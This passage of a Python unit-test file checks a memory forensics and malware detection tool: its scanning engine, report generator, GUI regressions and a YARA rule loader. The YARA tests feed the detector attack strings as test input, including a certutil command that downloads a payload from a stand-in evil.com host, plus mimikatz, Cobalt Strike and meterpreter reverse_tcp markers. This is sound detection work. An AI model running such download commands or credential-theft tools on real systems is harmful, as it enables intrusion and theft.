        r = e.advanced_ml_detect()
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('risk_level', r)

    def test_advanced_report(self):
        e = _loaded_engine()
        report = e.get_advanced_ml_report()
        self.assertIsInstance(report, str)
        self.assertIn('ADVANCED ENTERPRISE MALWARE DETECTION REPORT', report)

    def test_advanced_report_no_data(self):
        e = MemoryForensicsEngine()
        report = e.get_advanced_ml_report()
        self.assertIn('No data loaded', report)


class TestEngineEnterpriseScan(unittest.TestCase):
    """Tests for enterprise-grade full scan."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.run_enterprise_scan()
        self.assertIn('error', r)

    def test_full_scan(self):
        e = _loaded_engine()
        r = e.run_enterprise_scan()
        self.assertIn('layers', r)
        self.assertIn('summary', r)
        self.assertIn('advanced_ml', r['layers'])
        self.assertIn('signatures', r['layers'])
        self.assertIn('behavioral', r['layers'])
        self.assertIn('processes', r['layers'])
        self.assertIn('network', r['layers'])

    def test_summary_structure(self):
        e = _loaded_engine()
        r = e.run_enterprise_scan()
        s = r['summary']
        self.assertIn('threat_score', s)
        self.assertIn('risk_level', s)
        self.assertIn('is_malicious', s)
        self.assertIn('detection_count', s)
        self.assertIn(s['risk_level'], ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'])


class TestEngineDLLs(unittest.TestCase):
    """Tests for DLL analysis."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.analyze_dlls(), [])

    def test_finds_dlls(self):
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        self.assertIsInstance(dlls, list)
        self.assertGreater(len(dlls), 0)

    def test_dll_structure(self):
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        for dll in dlls:
            self.assertIn('name', dll)
            self.assertIn('offset', dll)
            self.assertIn('suspicious', dll)

    def test_finds_suspicious_dlls(self):
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        suspicious = [d for d in dlls if d['suspicious']]
        self.assertGreater(len(suspicious), 0)


class TestEngineRegistry(unittest.TestCase):
    """Tests for registry key extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_registry_keys(), [])

    def test_finds_registry_keys(self):
        e = _loaded_engine()
        keys = e.extract_registry_keys()
        self.assertIsInstance(keys, list)
        self.assertGreater(len(keys), 0)

    def test_registry_artifacts_enhanced(self):
        e = _loaded_engine()
        r = e.extract_registry_artifacts()
        self.assertIn('all_keys', r)
        self.assertIn('suspicious_keys', r)
        self.assertIn('normal_keys', r)
        self.assertIn('total', r)
        self.assertEqual(r['total'], len(r['all_keys']))

    def test_finds_suspicious_registry_keys(self):
        e = _loaded_engine()
        r = e.extract_registry_artifacts()
        self.assertGreater(len(r['suspicious_keys']), 0)


class TestEngineFilePaths(unittest.TestCase):
    """Tests for file path extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_file_paths(), [])

    def test_finds_paths(self):
        e = _loaded_engine()
        paths = e.extract_file_paths()
        self.assertIsInstance(paths, list)
        self.assertGreater(len(paths), 0)

    def test_path_format(self):
        e = _loaded_engine()
        paths = e.extract_file_paths()
        for path in paths:
            self.assertRegex(path, r'^[A-Z]:\\')


class TestEngineBehavioral(unittest.TestCase):
    """Tests for behavioral analysis."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.behavioral_analysis()
        self.assertEqual(r['score'], 0)
        self.assertEqual(r['level'], 'LOW')

    def test_with_test_dump(self):
        e = _loaded_engine()
        r = e.behavioral_analysis()
        self.assertIn('score', r)
        self.assertIn('level', r)
        self.assertIn('findings', r)
        self.assertIn('info', r)
        self.assertIn(r['level'], ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'])

    def test_findings_structure(self):
        e = _loaded_engine()
        r = e.behavioral_analysis()
        for f in r['findings']:
            self.assertIn('category', f)
            self.assertIn('severity', f)
            self.assertIn('detail', f)

    def test_risk_score_capped(self):
        e = _loaded_engine()
        r = e.behavioral_analysis()
        self.assertLessEqual(r['score'], 100)

    def test_score_stored_on_engine(self):
        e = _loaded_engine()
        e.behavioral_analysis()
        self.assertGreaterEqual(e.risk_score, 0)
        self.assertLessEqual(e.risk_score, 100)


class TestEngineEntropy(unittest.TestCase):
    """Tests for entropy analysis."""

    def test_no_data_entropy_analysis(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.entropy_analysis(), [])

    def test_no_data_calculate(self):
        e = MemoryForensicsEngine()
        r = e.calculate_entropy()
        self.assertEqual(r['overall'], 0.0)

    def test_entropy_blocks(self):
        e = _loaded_engine()
        blocks = e.entropy_analysis()
        self.assertIsInstance(blocks, list)
        self.assertGreater(len(blocks), 0)
        for b in blocks:
            self.assertIn('offset', b)
            self.assertIn('entropy', b)
            self.assertIn('classification', b)
            self.assertGreaterEqual(b['entropy'], 0)
            self.assertLessEqual(b['entropy'], 8.01)

    def test_calculate_entropy(self):
        e = _loaded_engine()
        r = e.calculate_entropy()
        self.assertIn('overall', r)
        self.assertIn('blocks', r)
        self.assertIn('high_entropy_regions', r)
        self.assertIn('classification', r)
        self.assertGreater(r['overall'], 0)

    def test_classification_values(self):
        e = _loaded_engine()
        r = e.calculate_entropy()
        valid = ['Encrypted/Packed', 'Compressed', 'Binary Data', 'Text/Code', 'Sparse/Empty']
        self.assertIn(r['classification'], valid)


class TestEngineHexDump(unittest.TestCase):
    """Tests for hex dump generation."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.hex_dump(0), "")

    def test_hex_dump(self):
        e = _loaded_engine()
        hd = e.hex_dump(0, 64)
        self.assertIsInstance(hd, str)
        self.assertGreater(len(hd), 0)
        # Check format: offset + hex + ascii
        lines = hd.split('\n')
        for line in lines:
            self.assertRegex(line, r'^[0-9a-f]{8}\s')

    def test_hex_dump_middle(self):
        e = _loaded_engine()
        hd = e.hex_dump(1000, 32)
        self.assertIn('000003e8', hd)  # 1000 in hex

    def test_hex_dump_past_end(self):
        e = _loaded_engine()
        hd = e.hex_dump(e.dump_size - 10, 256)
        lines = hd.strip().split('\n')
        self.assertGreater(len(lines), 0)


class TestEngineTimeline(unittest.TestCase):
    """Tests for timeline building."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.build_timeline(), [])

    def test_timeline_events(self):
        e = _loaded_engine()
        events = e.build_timeline()
        self.assertIsInstance(events, list)
        self.assertGreater(len(events), 0)

    def test_event_types(self):
        e = _loaded_engine()
        events = e.build_timeline()
        types = set(ev['type'] for ev in events)
        self.assertIn('Process', types)

    def test_ip_suspicion_logic(self):
        """Bug #8 fix: private IPs should NOT be suspicious, public IPs SHOULD be."""
        e = _loaded_engine()
        events = e.build_timeline()
        for ev in events:
            if ev['type'] == 'IP Address':
                ip = ev['name']
                is_private = (ip.startswith('10.') or ip.startswith('192.168.') or
                              ip.startswith('127.') or ip.startswith('172.16.'))
                if is_private:
                    self.assertFalse(ev.get('suspicious', False),
                                     f"Private IP {ip} should not be suspicious")
                # Public IPs should be suspicious
                if ip == '8.8.8.8' or ip == '185.220.101.42':
                    self.assertTrue(ev.get('suspicious', False),
                                    f"Public IP {ip} should be suspicious")


class TestEngineReport(unittest.TestCase):
    """Tests for report generation."""

    def test_report_structure(self):
        e = _loaded_engine()
        report = e.generate_report()
        self.assertIn('timestamp', report)
        self.assertIn('file_info', report)
        self.assertIn('risk_assessment', report)
        self.assertIn('malware_detections', report)
        self.assertIn('network_artifacts', report)
        self.assertIn('process_count', report)
        self.assertIn('dll_count', report)

    def test_report_file_info(self):
        e = _loaded_engine()
        report = e.generate_report()
        fi = report['file_info']
        self.assertIn('path', fi)
        self.assertIn('size', fi)
        self.assertIn('type', fi)
        self.assertIn('hashes', fi)


class TestEngineFullAnalysis(unittest.TestCase):
    """Tests for run_full_analysis."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.run_full_analysis(), {})

    def test_full_analysis(self):
        e = _loaded_engine()
        r = e.run_full_analysis()
        expected_keys = ['processes', 'network', 'malware', 'dlls', 'strings',
                         'behavioral', 'registry', 'file_paths', 'entropy',
                         'timeline', 'hashes', 'dump_type', 'risk_score']
        for key in expected_keys:
            self.assertIn(key, r, f"Missing key: {key}")


# ═══════════════════════════════════════════════════════════════
#  TEST: Report Generator
# ═══════════════════════════════════════════════════════════════

class TestReportGenerator(unittest.TestCase):
    """Tests for the enterprise HTML report generator."""

    def test_import(self):
        from report_generator import generate_enterprise_html_report
        self.assertTrue(callable(generate_enterprise_html_report))

    def test_generate_report(self):
        from report_generator import generate_enterprise_html_report
        e = _loaded_engine()
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            output_path = f.name
        try:
            result = generate_enterprise_html_report(e, output_path)
            self.assertTrue(os.path.exists(output_path))
            with open(output_path, 'r', encoding='utf-8') as f:
                content = f.read()
            self.assertIn('<html', content)
            self.assertIn('FORENSIC', content.upper())
        finally:
            if os.path.exists(output_path):
                os.unlink(output_path)

    def test_report_contains_key_sections(self):
        from report_generator import generate_enterprise_html_report
        e = _loaded_engine()
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            output_path = f.name
        try:
            generate_enterprise_html_report(e, output_path)
            with open(output_path, 'r', encoding='utf-8') as f:
                content = f.read()
            # Check for key HTML report sections
            self.assertIn('Risk', content)
        finally:
            if os.path.exists(output_path):
                os.unlink(output_path)


# ═══════════════════════════════════════════════════════════════
#  TEST: GUI (headless — no display required)
# ═══════════════════════════════════════════════════════════════

class TestGUICreation(unittest.TestCase):
    """Test that GUI can be instantiated headlessly."""

    @classmethod
    def setUpClass(cls):
        """Try to create a Tk root. Skip all tests if no display."""
        try:
            cls.root = MagicMock()
            # We can't easily test real tkinter without a display, but we can
            # verify the class exists and its constructor signature
        except Exception:
            cls.root = None

    def test_gui_class_exists(self):
        from memory_forensics_tool import MemoryForensicsGUI
        self.assertTrue(callable(MemoryForensicsGUI))

    def test_color_scheme(self):
        from memory_forensics_tool import MemoryForensicsGUI
        colors = MemoryForensicsGUI.COLORS
        self.assertIn('bg_dark', colors)
        self.assertIn('accent_blue', colors)
        self.assertIn('accent_red', colors)
        self.assertIn('text_primary', colors)
        # All colors should be valid hex
        for name, color in colors.items():
            self.assertRegex(color, r'^#[0-9a-fA-F]{6}$', f"Invalid color {name}: {color}")

    def test_gui_with_real_tk(self):
        """If a display is available, test real GUI creation."""
        try:
            import tkinter as tk
            root = tk.Tk()
            root.withdraw()
            from memory_forensics_tool import MemoryForensicsGUI
            gui = MemoryForensicsGUI(root)
            # Verify critical widgets exist
            self.assertIsNotNone(gui.engine)
            self.assertIsNotNone(gui.notebook)
            self.assertIsNotNone(gui.progress)
            root.destroy()
        except tk.TclError:
            self.skipTest("No display available for GUI test")


# ═══════════════════════════════════════════════════════════════
#  TEST: Edge Cases & Regression Tests
# ═══════════════════════════════════════════════════════════════

class TestEdgeCases(unittest.TestCase):
    """Edge cases and regression tests for previously found bugs."""

    def test_process_dict_uses_suspicious_key(self):
        """Bug #1: Process dicts must use 'suspicious' key, NOT 'is_suspicious'."""
        e = _loaded_engine()
        procs = e.find_processes()
        for p in procs:
            self.assertIn('suspicious', p)
            self.assertNotIn('is_suspicious', p)

    def test_dll_dict_uses_suspicious_key(self):
        """DLL dicts must also use 'suspicious' key."""
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        for d in dlls:
            self.assertIn('suspicious', d)

    def test_severity_icon_critical(self):
        """Bug #3: CRITICAL severity should map to correct icon/handling."""
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        for sig in sigs:
            if sig['severity'] == 'CRITICAL':
                self.assertIn(sig['severity'], ['CRITICAL'])

    def test_behavioral_result_dict_format(self):
        """Bug #4: Dashboard should get dict with .get() access."""
        e = _loaded_engine()
        r = e.behavioral_analysis()
        # Must be a dict, not raw string
        self.assertIsInstance(r, dict)
        # Must support .get() access
        self.assertIsNotNone(r.get('score'))
        self.assertIsNotNone(r.get('level'))
        self.assertIsNotNone(r.get('findings'))

    def test_timeline_ip_suspicion_private_not_suspicious(self):
        """Bug #8: Private IPs should NOT be flagged as suspicious."""
        e = _loaded_engine()
        events = e.build_timeline()
        for ev in events:
            if ev['type'] == 'IP Address':
                ip = ev['name']
                if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
                    self.assertFalse(ev.get('suspicious', False))

    def test_report_uses_suspicious_key(self):
        """Bug #1: generate_enterprise_html_report accesses p['suspicious']."""
        from report_generator import generate_enterprise_html_report
        e = _loaded_engine()
        procs = e.find_processes()
        # Verify the key that the report uses
        for p in procs:
            self.assertIn('suspicious', p)
            # This would raise KeyError if wrong key is used
            _ = p['suspicious']

    def test_empty_engine_no_crash(self):
        """All engine methods should handle no-data gracefully."""
        e = MemoryForensicsEngine()
        self.assertEqual(e.find_processes(), [])
        self.assertEqual(e.extract_network_artifacts(), {})
        self.assertEqual(e.detect_malware_signatures(), [])
        self.assertEqual(e.analyze_dlls(), [])
        self.assertEqual(e.extract_strings(), [])
        self.assertEqual(e.extract_registry_keys(), [])
        self.assertEqual(e.extract_file_paths(), [])
        self.assertEqual(e.entropy_analysis(), [])
        self.assertEqual(e.hex_dump(0), "")
        self.assertEqual(e.build_timeline(), [])
        self.assertEqual(e.run_full_analysis(), {})

    def test_multiple_analyses_dont_accumulate(self):
        """Running analysis multiple times should give consistent results."""
        e = _loaded_engine()
        r1 = e.behavioral_analysis()
        r2 = e.behavioral_analysis()
        self.assertEqual(r1['score'], r2['score'])
        self.assertEqual(len(r1['findings']), len(r2['findings']))


class TestGUIRegressions(unittest.TestCase):
    """Regression tests for GUI handler bugs found in session 4."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_bug12_extract_file_paths_resets_registry_stats(self, mock_ttk, mock_tk):
        """Bug #12: extract_file_paths should reset registry-related stat labels."""
        # Verify the source code contains the reset lines
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_file_paths)
        # Must reset Registry Keys and Persistence Keys labels
        self.assertIn("reg_stat_labels['Registry Keys']", source)
        self.assertIn("reg_stat_labels['Persistence Keys']", source)
        # Must clear the persistence indicators panel
        self.assertIn("reg_susp_frame", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_bug12_extract_registry_resets_file_stats(self, mock_ttk, mock_tk):
        """Bug #12: extract_registry should reset file-path-related stat labels."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_registry)
        # Must reset File Paths and System Paths labels
        self.assertIn("reg_stat_labels['File Paths']", source)
        self.assertIn("reg_stat_labels['System Paths']", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_bug13_ml_scan_clears_tree(self, mock_ttk, mock_tk):
        """Bug #13: ml_scan_malware should clear malware_tree before inserting."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.ml_scan_malware)
        # Must contain a delete call on malware_tree
        self.assertIn("malware_tree.delete", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_all_scan_methods_clear_tree(self, mock_ttk, mock_tk):
        """All malware scan methods should clear tree before inserting."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        for method_name in ['scan_malware', 'ml_scan_malware', 'hybrid_malware_scan', 'enterprise_malware_scan']:
            method = getattr(MemoryForensicsGUI, method_name)
            source = inspect.getsource(method)
            self.assertIn("malware_tree.delete", source,
                         f"{method_name} does not clear malware_tree")

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_extract_file_paths_clears_tree(self, mock_ttk, mock_tk):
        """Bug #11 regression: extract_file_paths must clear reg_tree."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_file_paths)
        self.assertIn("reg_tree.get_children", source)
        self.assertIn("reg_tree.delete", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_extract_registry_clears_tree(self, mock_ttk, mock_tk):
        """extract_registry must clear reg_tree before inserting."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_registry)
        self.assertIn("reg_tree.get_children", source)
        self.assertIn("reg_tree.delete", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_shared_tree_handlers_clear_stale_stats(self, mock_ttk, mock_tk):
        """Both registry and file path handlers must reset the other's stats."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI

        # extract_registry resets file path stats
        reg_src = inspect.getsource(MemoryForensicsGUI.extract_registry)
        self.assertIn("File Paths", reg_src)
        self.assertIn("System Paths", reg_src)

        # extract_file_paths resets registry stats
        fp_src = inspect.getsource(MemoryForensicsGUI.extract_file_paths)
        self.assertIn("Registry Keys", fp_src)
        self.assertIn("Persistence Keys", fp_src)


class TestEngineMethodConsistency(unittest.TestCase):
    """Tests for engine method return type consistency."""

    def test_behavioral_analysis_has_info_key(self):
        """behavioral_analysis must return 'info' key for informational findings."""
        e = _loaded_engine()
        result = e.behavioral_analysis()
        self.assertIn('info', result)
        self.assertIsInstance(result['info'], list)

    def test_behavioral_analysis_level_matches_score(self):
        """Level should match score thresholds consistently."""
        e = _loaded_engine()
        result = e.behavioral_analysis()
        score = result['score']
        level = result['level']
        if score >= 70:
            self.assertEqual(level, 'CRITICAL')
        elif score >= 50:
            self.assertEqual(level, 'HIGH')
        elif score >= 25:
            self.assertEqual(level, 'MEDIUM')
        else:
            self.assertEqual(level, 'LOW')

    def test_enterprise_scan_returns_summary(self):
        """Enterprise scan must return summary with required keys."""
        e = _loaded_engine()
        result = e.run_enterprise_scan()
        self.assertIn('summary', result)
        summary = result['summary']
        for key in ['threat_score', 'risk_level', 'is_malicious', 'detection_count', 'precision_estimate']:
            self.assertIn(key, summary, f"Missing key: {key}")

    def test_enterprise_scan_returns_layers(self):
        """Enterprise scan must return all 5 analysis layers."""
        e = _loaded_engine()
        result = e.run_enterprise_scan()
        self.assertIn('layers', result)
        layers = result['layers']
        for layer in ['advanced_ml', 'signatures', 'behavioral', 'processes', 'network']:
            self.assertIn(layer, layers, f"Missing layer: {layer}")

    def test_ml_detect_returns_validation(self):
        """ML detection must return validation info."""
        e = _loaded_engine()
        result = e.ml_detect_malware()
        self.assertIn('validation', result)
        self.assertIn('estimated_precision', result)

    def test_advanced_ml_returns_detections_list(self):
        """Advanced ML must return detections as a list."""
        e = _loaded_engine()
        result = e.advanced_ml_detect()
        self.assertIn('detections', result)
        self.assertIsInstance(result['detections'], list)

    def test_run_full_analysis_returns_all_keys(self):
        """run_full_analysis must return all expected keys."""
        e = _loaded_engine()
        result = e.run_full_analysis()
        expected = ['processes', 'network', 'malware', 'dlls', 'strings',
                    'behavioral', 'registry', 'file_paths', 'entropy',
                    'timeline', 'hashes', 'dump_type', 'risk_score']
        for key in expected:
            self.assertIn(key, result, f"Missing key: {key}")


class TestDataIntegrity(unittest.TestCase):
    """Tests for data integrity and consistency."""

    def test_dump_file_exists(self):
        self.assertTrue(os.path.exists(TEST_DUMP))

    def test_dump_not_empty(self):
        self.assertGreater(os.path.getsize(TEST_DUMP), 0)

    def test_dump_size_reasonable(self):
        """Test dump should be ~100KB"""
        size = os.path.getsize(TEST_DUMP)
        self.assertGreater(size, 50000)
        self.assertLess(size, 200000)

    def test_dump_has_binary_content(self):
        with open(TEST_DUMP, 'rb') as f:
            data = f.read(256)
        # Should start with null bytes (our padding)
        self.assertEqual(data[0], 0)

    def test_dump_hash_reproducible(self):
        with open(TEST_DUMP, 'rb') as f:
            h1 = hashlib.md5(f.read()).hexdigest()
        with open(TEST_DUMP, 'rb') as f:
            h2 = hashlib.md5(f.read()).hexdigest()
        self.assertEqual(h1, h2)


# ═══════════════════════════════════════════════════════════════
#  TEST: Integration Tests
# ═══════════════════════════════════════════════════════════════

class TestIntegration(unittest.TestCase):
    """End-to-end integration tests."""

    def test_load_analyze_report(self):
        """Full pipeline: load → analyze → report."""
        e = MemoryForensicsEngine()
        e.load_dump(TEST_DUMP)
        results = e.run_full_analysis()
        report = e.generate_report()
        self.assertIsInstance(results, dict)
        self.assertIsInstance(report, dict)
        self.assertGreater(len(results), 0)

    def test_load_and_enterprise_scan(self):
        """Full enterprise scan pipeline."""
        e = MemoryForensicsEngine()
        e.load_dump(TEST_DUMP)
        r = e.run_enterprise_scan()
        self.assertIn('summary', r)
        self.assertGreater(r['summary']['threat_score'], 0)

    def test_all_detectors_run_without_error(self):
        """Run every detector on test dump without crashing."""
        e = _loaded_engine()
        e.find_processes()
        e.extract_network_artifacts()
        e.detect_malware_signatures()
        e.analyze_dlls()
        e.extract_strings()
        e.behavioral_analysis()
        e.extract_registry_artifacts()
        e.extract_file_paths()
        e.calculate_entropy()
        e.build_timeline()
        e.ml_detect_malware()
        e.advanced_ml_detect()
        e.run_enterprise_scan()
        e.get_ml_analysis_report()
        e.get_advanced_ml_report()
        e.hex_dump(0, 128)
        e.generate_report()
        e.run_full_analysis()

    def test_json_export_format(self):
        """Results should be JSON-serializable."""
        e = _loaded_engine()
        results = e.run_full_analysis()
        # Should not raise
        json_str = json.dumps(results, indent=2)
        self.assertIsInstance(json_str, str)
        # Should be parseable back
        parsed = json.loads(json_str)
        self.assertEqual(set(results.keys()), set(parsed.keys()))

    def test_html_report_generation(self):
        """Generate a full HTML report and verify it's valid."""
        try:
            from report_generator import generate_enterprise_html_report
        except ImportError:
            self.skipTest("report_generator not available")

        e = _loaded_engine()
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            path = f.name
        try:
            generate_enterprise_html_report(e, path)
            self.assertTrue(os.path.exists(path))
            size = os.path.getsize(path)
            self.assertGreater(size, 1000)  # Should be substantial
        finally:
            if os.path.exists(path):
                os.unlink(path)


# ═══════════════════════════════════════════════════════════════
#  TEST: External YARA Loader
# ═══════════════════════════════════════════════════════════════

class TestExternalYARALoader(unittest.TestCase):
    """Tests for the ExternalYARALoader class."""

    @classmethod
    def setUpClass(cls):
        rules_dir = os.path.join(_script_dir, 'yara_rules')
        if os.path.isdir(rules_dir):
            cls.loader = ExternalYARALoader(rules_dir)
            cls.has_rules = True
        else:
            cls.loader = None
            cls.has_rules = False

    def test_loader_initializes(self):
        """ExternalYARALoader should initialize without error."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        self.assertIsNotNone(self.loader)

    def test_rules_loaded(self):
        """Should load a substantial number of rules."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        stats = self.loader.get_stats()
        self.assertGreater(stats['rules'], 100, "Expected 100+ rules loaded")
        self.assertGreater(stats['files'], 50, "Expected 50+ .yar files parsed")

    def test_text_patterns_extracted(self):
        """Should extract text patterns from rules."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        stats = self.loader.get_stats()
        self.assertGreater(stats['text_patterns'], 200, "Expected 200+ text patterns")

    def test_pattern_index_built(self):
        """Pattern index should have entries for fast lookup."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        self.assertGreater(len(self.loader.pattern_index), 100)

    def test_match_mimikatz(self):
        """Should match 'mimikatz' against credential theft rules."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa kerberos wdigest")
        self.assertGreater(len(matches), 0, "Expected YARA match for mimikatz")
        rule_names = [m['rule_name'] for m in matches]
        self.assertTrue(any('Mimikatz' in r or 'mimikatz' in r.lower() for r in rule_names))

    def test_match_cobalt_strike(self):
        """Should match Cobalt Strike beacon patterns."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("beacon.dll beacon.x64.dll ReflectiveLoader")
        self.assertGreater(len(matches), 0, "Expected YARA match for Cobalt Strike")

    def test_no_match_for_benign(self):
        """Should NOT match benign process names."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("chrome.exe")
        self.assertEqual(len(matches), 0, "chrome.exe should not trigger YARA rules")

    def test_no_match_for_svchost(self):
        """Should NOT match legitimate system processes."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("svchost.exe")
        self.assertEqual(len(matches), 0, "svchost.exe should not trigger YARA rules")

    def test_severity_in_matches(self):
        """Matched rules should include severity metadata."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos")
        if matches:
            self.assertIn('severity', matches[0])
            self.assertIn(matches[0]['severity'].lower(), ['critical', 'high', 'medium', 'low'])

    def test_match_lolbin_certutil(self):
        """Should match certutil abuse pattern."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("certutil -urlcache -split http://evil.com/payload")
        self.assertGreater(len(matches), 0, "Expected YARA match for certutil abuse")

    def test_match_returns_rule_name(self):
        """Matches should include rule_name field."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("meterpreter metsrv stdapi reverse_tcp")
        if matches:
            self.assertIn('rule_name', matches[0])
            self.assertIn('description', matches[0])

    def test_empty_text_no_matches(self):
        """Empty text should return no matches."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("")
        self.assertEqual(len(matches), 0)

    def test_nonexistent_dir(self):
        """Loading from nonexistent directory should not crash."""
        loader = ExternalYARALoader("/nonexistent/path/does/not/exist")
        stats = loader.get_stats()
        self.assertEqual(stats['rules'], 0)

    def test_get_stats_keys(self):
        """get_stats should return expected keys."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        stats = self.loader.get_stats()
        for key in ['rules', 'files', 'text_patterns', 'errors']:
            self.assertIn(key, stats)


class TestEnhancedProcessCheck(unittest.TestCase):
    """Tests for the enhanced hybrid ML process check pipeline."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_score_yara_matches_critical(self, mock_ttk, mock_tk):
        """Critical YARA matches should score 40 per match."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._score_yara_matches)
        self.assertIn("'critical': 40", source)
        self.assertIn("min(100", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_has_4_layers(self, mock_ttk, mock_tk):
        """_enhanced_process_check should implement 4 detection layers."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        # Layer 1: heuristic
        self.assertIn("_check_suspicious_process", source)
        # Layer 2: YARA
        self.assertIn("yara_loader", source)
        self.assertIn("match_text", source)
        # Layer 3: behavioral
        self.assertIn("_get_process_details", source)
        self.assertIn("_analyze_process_behavior", source)
        # Layer 4: ensemble
        self.assertIn("ensemble_score", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_returns_4_values(self, mock_ttk, mock_tk):
        """_enhanced_process_check should return (is_susp, reason, score, details)."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        # Must return detection_details dict
        self.assertIn("detection_details", source)
        self.assertIn("return is_suspicious, reason_str, ensemble_score, detection_details", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_has_corroboration_logic(self, mock_ttk, mock_tk):
        """Should boost scores when multiple layers agree."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        self.assertIn("high_layers", source)
        self.assertIn("1.15", source)  # corroboration boost
        self.assertIn("0.85", source)  # dampening

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_has_named_malware_override(self, mock_ttk, mock_tk):
        """Critical YARA matches with 2+ strings should override to 95+."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        self.assertIn("95", source)
        self.assertIn("match_count", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_monitor_loop_uses_enhanced_check(self, mock_ttk, mock_tk):
        """Monitor loop should call _enhanced_process_check for deep analysis."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn("_enhanced_process_check", source)
        self.assertIn("candidates_for_deep", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_monitor_loop_limits_deep_analysis(self, mock_ttk, mock_tk):
        """Monitor loop should limit deep analysis to max 5 per cycle."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn("[:5]", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_monitor_loop_includes_yara_in_alerts(self, mock_ttk, mock_tk):
        """Monitor alerts should include YARA match information."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn("yara_info", source)
        self.assertIn("[YARA:", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_realtime_tab_initializes_yara_loader(self, mock_ttk, mock_tk):
        """create_realtime_tab should initialize yara_loader attribute."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
